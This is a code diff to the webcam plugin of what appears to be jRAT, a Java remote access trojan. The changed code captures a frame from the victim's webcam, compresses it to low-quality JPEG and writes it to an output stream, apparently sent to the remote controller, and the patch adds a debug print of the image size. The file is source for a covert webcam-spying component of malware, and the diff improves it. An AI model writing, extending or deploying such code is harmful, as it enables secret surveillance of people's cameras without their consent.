@@ -1,8 +1,16 @@
 package pro.jrat.plugin.stub;
 
 import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.util.Iterator;
+
+import javax.imageio.IIOImage;
+import javax.imageio.ImageIO;
+import javax.imageio.ImageWriteParam;
+import javax.imageio.ImageWriter;
+import javax.imageio.stream.ImageOutputStream;
 
 import pro.jrat.api.stub.StubPlugin;
 
@@ -50,7 +58,20 @@ public class WebcamPlugin extends StubPlugin {
 					
 					BufferedImage image = cam.getImage();
 
-					byte[] buffer = Utils.encodeImage(image, 1F);
+					ByteArrayOutputStream baos = new ByteArrayOutputStream();
+					ImageOutputStream ios = ImageIO.createImageOutputStream(baos);
+					Iterator<ImageWriter> iterators = ImageIO.getImageWritersByFormatName("jpeg");
+					ImageWriter imgwriter = iterators.next();
+					ImageWriteParam imgwriterp = imgwriter.getDefaultWriteParam();
+					imgwriterp.setCompressionMode(2);
+					imgwriterp.setCompressionQuality(0.25f);
+					imgwriter.setOutput(ios);
+					imgwriter.write(null, new IIOImage(image, null, null), imgwriterp);
+					imgwriter.dispose();
+					
+					byte[] buffer = baos.toByteArray();
+					
+					System.out.println(image.getWidth() + " " + image.getHeight());
 
 					dos.writeInt(buffer.length);
 					dos.write(buffer);
